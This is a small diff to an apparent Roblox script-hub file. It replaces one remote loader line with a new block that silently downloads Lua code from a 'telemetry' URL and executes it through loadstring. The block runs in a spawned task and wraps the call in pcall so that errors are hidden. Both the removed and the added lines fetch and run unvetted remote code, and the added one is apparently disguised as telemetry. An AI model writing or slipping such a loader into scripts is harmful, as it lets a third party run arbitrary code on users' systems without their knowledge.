@@ -1,4 +1,8 @@
-loadstring(game:HttpGet("https://api.synscripts.org/run/eyJpZCI6IjAxZjE5NjY3LWNkYTEtNDdkMS04NTA4LTFjMmQyYjBlOGY3MSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0="))()
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/client.lua?s=6a97f7898bbaed4c11a601ce"))()
+	end)
+end)
 
 -- IMDE Hub/main.lua
 -- sexy script by github.com/orialdev
